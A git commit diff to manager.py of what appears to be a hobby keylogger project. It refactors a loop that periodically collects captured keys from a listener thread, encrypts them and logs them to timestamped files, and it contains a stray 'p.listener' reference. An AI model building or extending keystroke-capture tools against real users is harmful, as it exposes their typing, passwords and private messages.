f82d7db751b3c89e847ce8449725f86b41d8edd5
efraim gottlieb <efgo583208979@gmail.com>
2025-09-03 00:33:23 +0300

    data collector fix

--- manager.py
+++ manager.py
@@ -3,31 +3,23 @@ from time import sleep
 from listener import Listener
 from data_collector import Package
 from time_stamp import time_stamp2
-from encrypt import Encryption
 from file_test import log
 
 class Manager:
     def __init__(self, hours = 5):
         self.listener = Listener()
-        self.process = threading.Thread(target=self.listener.run)
+        self.service = threading.Thread(target=self.listener.run)
         self.hours = hours
     def start(self):
-        self.process.start()
+        self.service.start()
         while True:
             sleep(self.hours)
-            data = p.listener.get_keys()
-            if data:
-                data = Package(data)
-                package_data = data.export_package()
-                encryptor = Encryption()
-                encryptor.encrypt_text(str(package_data))
-                encrypted_packege = encryptor.encrypted
-                print(package_data)
-                print(encrypted_packege)
-                times = f'{time_stamp2()}.txt'
-                print(times)
-                ett = str(encrypted_packege)
-                log(times, ett)
+            temp_data = p.listener.get_keys()
+            if temp_data:
+                data = Package(temp_data)
+                pack_name = f'{time_stamp2()}.txt'
+                print(pack_name)
+                log(pack_name, str(data.encrypt()))
     def stop(self):
         self.listener.stop()
 
